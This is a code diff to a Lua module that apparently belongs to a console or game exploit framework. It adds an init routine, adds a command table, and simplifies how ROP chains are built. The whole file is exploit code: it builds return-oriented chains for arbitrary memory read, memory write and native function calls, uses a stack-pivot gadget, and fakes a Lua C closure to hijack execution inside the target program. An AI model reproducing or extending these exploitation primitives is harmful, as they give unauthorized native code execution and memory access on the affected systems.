@@ -1,5 +1,22 @@
 
+native_cmd = {
+    read_buffer = 0,
+    write_buffer = 1,
+    fcall = 2,
+}
+
 native = {}
+
+function native.init()
+
+    local pivot_handler = gadgets.stack_pivot[2]
+    native.pivot_handler_rop = native.setup_pivot_handler(pivot_handler)
+    
+    native_cmd_handler = native.create_cmd_handler()
+    native_invoke = lua.create_fake_cclosure(pivot_handler.gadget_addr)
+
+    syscall.do_sanity_check()
+end
 
 function native.get_lua_opt(chain, fn, a1, a2, a3)
     chain:push_fcall_raw(fn, function()
@@ -12,9 +29,7 @@ end
 
 function native.gen_fcall_chain(lua_state)
 
-    local chain = ropchain({
-        start_from_base = true,
-    })
+    local chain = ropchain()
     
     native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 1 - fn addr
     native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 4, 0)  -- 2 - rax (for syscall)
@@ -49,9 +64,7 @@ end
 
 function native.gen_read_buffer_chain(lua_state)
 
-    local chain = ropchain({
-        start_from_base = true,
-    })
+    local chain = ropchain()
 
     native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 1 - addr to read
     native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 4, 0)  -- 2 - size
@@ -67,9 +80,7 @@ end
 
 function native.gen_write_buffer_chain(lua_state)
 
-    local chain = ropchain({
-        start_from_base = true,
-    })
+    local chain = ropchain()
 
     chain.string_len = memory.alloc(0x8)
 
@@ -93,9 +104,7 @@ function native.setup_cmd_handler(pivot_handler)
         stack_offset = -0x68
     end
 
-    local chain = ropchain({
-        start_from_base = true,
-    })
+    local chain = ropchain()
 
     chain.jmpbuf = memory.alloc(0x100)
     chain.jump_table = memory.alloc(0x8 * 16)
@@ -152,7 +161,6 @@ function native.setup_pivot_handler(pivot_handler)
 
     local chain = ropchain({
         stack_base = pivot_handler.pivot_addr,
-        start_from_base = true,
     })
 
     -- rbx = rdi (lua state)
@@ -179,17 +187,6 @@ function native.create_cmd_handler()
     local cmd_handler = native.setup_cmd_handler(native.pivot_handler_rop)
     native.setup_native_handler(cmd_handler)
     return cmd_handler.stack_base:tonumber()
-end
-
-function native.init()
-
-    local pivot_handler = gadgets.stack_pivot[2]
-    native.pivot_handler_rop = native.setup_pivot_handler(pivot_handler)
-    
-    native_cmd_handler = native.create_cmd_handler()
-    native_invoke = lua.create_fake_cclosure(pivot_handler.gadget_addr)
-
-    syscall.do_sanity_check()
 end
 
 function native.fcall_with_rax(fn_addr, rax, rdi, rsi, rdx, rcx, r8, r9)
